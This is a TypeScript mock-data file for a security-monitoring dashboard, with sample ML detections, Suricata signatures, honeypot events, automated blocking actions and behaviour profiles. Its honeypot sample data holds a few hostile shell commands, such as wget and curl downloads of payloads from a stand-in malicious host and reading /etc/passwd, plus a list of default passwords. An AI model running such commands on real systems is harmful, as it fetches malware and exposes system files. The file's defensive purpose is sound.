// Mock data matching the FastAPI backend schema.
// Replace these with fetch() calls to your /api/* endpoints when ready.

export type Severity = "CRITICAL" | "WARNING" | "INFO";

export interface Prediction {
  timestamp: string;
  src_ip: string;
  dst_ip: string;
  dst_port: number;
  prediction: "ATTACK" | "NORMAL";
  severity: Severity;
  anomaly_score: number;
  shap_top5: { feature: string; value: number }[];
}

export interface SuricataAlert {
  timestamp: string;
  src_ip: string;
  dst_ip: string;
  dst_port: number;
  signature: string;
  category: string;
  severity: Severity;
}

export interface HoneypotAlert {
  timestamp: string;
  src_ip: string;
  username: string;
  password: string;
  event_type: string;
  command: string;
  auto_blocked: boolean;
}

export interface SoarAction {
  timestamp: string;
  src_ip: string;
  action: string;
  reason: string;
  ai_score: number;
  telegram_sent: boolean;
  firewall_blocked: boolean;
}

export interface BlockedIp {
  ip_address: string;
  block_type: "HARD" | "SOFT";
  reason: string;
  blocked_at: string;
  auto_unblock_at: string | null;
}

export interface TopAttacker {
  src_ip: string;
  count: number;
  worst_score: number;
  last_seen: string;
}

export interface UebaProfile {
  ip: string;
  ports_seen: number;
  dsts_seen: number;
  active_hours: { hour: number; count: number }[];
  alerted: boolean;
  abuseipdb: number;
  ueba_alerts: {
    timestamp: string;
    alert_type: string;
    description: string;
    severity: Severity;
  }[];
}

const ips = ["185.220.101.42", "45.155.205.18", "103.224.182.91", "192.168.1.45", "10.0.12.7", "194.26.29.44", "212.34.56.78", "91.219.236.222"];
const sigs = ["ET SCAN Nmap Scripting Engine", "ET EXPLOIT Possible CVE-2021-44228 Log4j RCE", "ET POLICY SSH Brute Force", "ET MALWARE Mirai Botnet TR-069 Exploit", "ET WEB_SERVER SQL Injection Attempt"];
const cats = ["Attempted Recon", "Web Application Attack", "Brute Force", "Malware Activity", "Policy Violation"];
const cmds = ["wget http://malicious.host/x.sh", "cat /etc/passwd", "uname -a; whoami", "curl -O http://1.2.3.4/mirai.arm", "rm -rf /tmp/.cache && busybox wget"];
const users = ["root", "admin", "ubuntu", "pi", "oracle", "postgres"];
const passes = ["123456", "admin", "password", "toor", "raspberry", "P@ssw0rd"];
const features = ["bytes_in", "pkt_count", "tcp_flags_syn", "dst_port_entropy", "iat_mean", "fwd_pkt_len_max", "flow_duration"];

const now = Date.now();
const ts = (m: number) => new Date(now - m * 60_000).toISOString();
const pick = <T,>(a: T[], i: number) => a[i % a.length];

export const mockPredictions: Prediction[] = Array.from({ length: 24 }, (_, i) => ({
  timestamp: ts(i * 3),
  src_ip: pick(ips, i),
  dst_ip: "10.0.0.5",
  dst_port: pick([22, 80, 443, 3389, 8080, 445], i),
  prediction: i % 9 === 0 ? "NORMAL" : "ATTACK",
  severity: i % 4 === 0 ? "CRITICAL" : i % 3 === 0 ? "WARNING" : "INFO",
  anomaly_score: +(0.5 + (i % 50) / 100).toFixed(3),
  shap_top5: Array.from({ length: 5 }, (_, k) => ({
    feature: pick(features, i + k),
    value: +((Math.sin(i + k) * 0.4).toFixed(3)),
  })),
}));

export const mockSuricata: SuricataAlert[] = Array.from({ length: 18 }, (_, i) => ({
  timestamp: ts(i * 4 + 1),
  src_ip: pick(ips, i + 1),
  dst_ip: "10.0.0.5",
  dst_port: pick([22, 80, 443, 3389], i),
  signature: pick(sigs, i),
  category: pick(cats, i),
  severity: i % 5 === 0 ? "CRITICAL" : i % 2 === 0 ? "WARNING" : "INFO",
}));

export const mockHoneypot: HoneypotAlert[] = Array.from({ length: 16 }, (_, i) => ({
  timestamp: ts(i * 5 + 2),
  src_ip: pick(ips, i + 2),
  username: pick(users, i),
  password: pick(passes, i),
  event_type: i % 3 === 0 ? "command.input" : "login.failed",
  command: pick(cmds, i),
  auto_blocked: i % 2 === 0,
}));

export const mockSoar: SoarAction[] = Array.from({ length: 14 }, (_, i) => ({
  timestamp: ts(i * 6 + 1),
  src_ip: pick(ips, i),
  action: pick(["BLOCK_IP", "ALERT_SOC", "QUARANTINE", "RATE_LIMIT"], i),
  reason: pick(["AI anomaly score > 0.9", "Honeypot trigger", "Suricata critical sig", "UEBA deviation"], i),
  ai_score: +(0.6 + (i % 40) / 100).toFixed(2),
  telegram_sent: i % 2 === 0,
  firewall_blocked: i % 3 !== 0,
}));

export const mockBlocked: BlockedIp[] = Array.from({ length: 10 }, (_, i) => ({
  ip_address: pick(ips, i),
  block_type: i % 3 === 0 ? "HARD" : "SOFT",
  reason: pick(["Auto SOAR — AI score 0.97", "Manual block", "Honeypot brute force"], i),
  blocked_at: ts(i * 30 + 5),
  auto_unblock_at: i % 3 === 0 ? null : new Date(now + (60 - i) * 60_000).toISOString(),
}));

export const mockTopAttackers: TopAttacker[] = ips.slice(0, 7).map((ip, i) => ({
  src_ip: ip,
  count: 240 - i * 28,
  worst_score: +(0.99 - i * 0.05).toFixed(2),
  last_seen: ts(i * 7),
}));

export const mockTimeline = Array.from({ length: 60 }, (_, i) => ({
  t: new Date(now - (60 - i) * 60_000).toISOString(),
  attacks: Math.round(20 + Math.sin(i / 4) * 12 + Math.random() * 8),
  normal: Math.round(80 + Math.cos(i / 5) * 18 + Math.random() * 10),
}));

export const mockStats = {
  predictions: { attacks: 1284, normal: 18432, critical: 142, warnings: 387, total: 19716 },
  suricata: { total: 642 },
  honeypot: { total: 318 },
  soar: { total: 96 },
  blocked: { total: 41 },
};

export const mockUeba = (ip: string): UebaProfile => ({
  ip,
  ports_seen: 27,
  dsts_seen: 14,
  active_hours: Array.from({ length: 24 }, (_, h) => ({
    hour: h,
    count: Math.max(0, Math.round(Math.sin((h - 2) / 3) * 18 + 10 + (h > 22 || h < 5 ? 25 : 0))),
  })),
  alerted: true,
  abuseipdb: 87,
  ueba_alerts: [
    { timestamp: ts(12), alert_type: "PORT_SCAN", description: "Probed 27 unique ports in 5min", severity: "CRITICAL" },
    { timestamp: ts(45), alert_type: "OFF_HOURS", description: "Activity at 03:14 UTC outside baseline", severity: "WARNING" },
    { timestamp: ts(120), alert_type: "BEACON", description: "Periodic 60s connections to C2 candidate", severity: "WARNING" },
    { timestamp: ts(240), alert_type: "GEO_ANOMALY", description: "First-time source country: RU", severity: "INFO" },
  ],
});
